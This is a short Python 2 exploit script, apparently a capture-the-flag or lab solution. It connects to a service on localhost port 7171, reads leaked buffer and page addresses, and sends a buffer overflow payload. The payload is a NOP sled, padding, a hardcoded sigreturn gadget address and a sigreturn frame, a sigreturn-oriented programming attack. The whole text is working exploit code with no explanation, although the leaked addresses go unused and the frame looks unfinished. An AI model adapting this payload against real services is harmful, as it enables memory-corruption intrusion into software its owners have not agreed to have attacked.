from socket import create_connection
import struct
import string
from Frame import SigreturnFrame

all_letters = string.letters[26:]
ip = "localhost"

SIGRETURN_IND = 0x08048ee3

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection((ip, 7171))
buffer_address = recv_n_bytes(s, 8)
print repr(buffer_address)
buffer_address = struct.unpack("<Q", buffer_address)[0]
print hex(buffer_address)

page = recv_n_bytes(s, 8)
print repr(page)
page = struct.unpack("<Q", page)[0]
print hex(page)

sploit  = "\x90" * 0x208
sploit += "B" * 4
sploit += struct.pack("<I", SIGRETURN_IND)

sploit += SigreturnFrame(nulls_allowed=True).get_frame()
s.send(sploit)
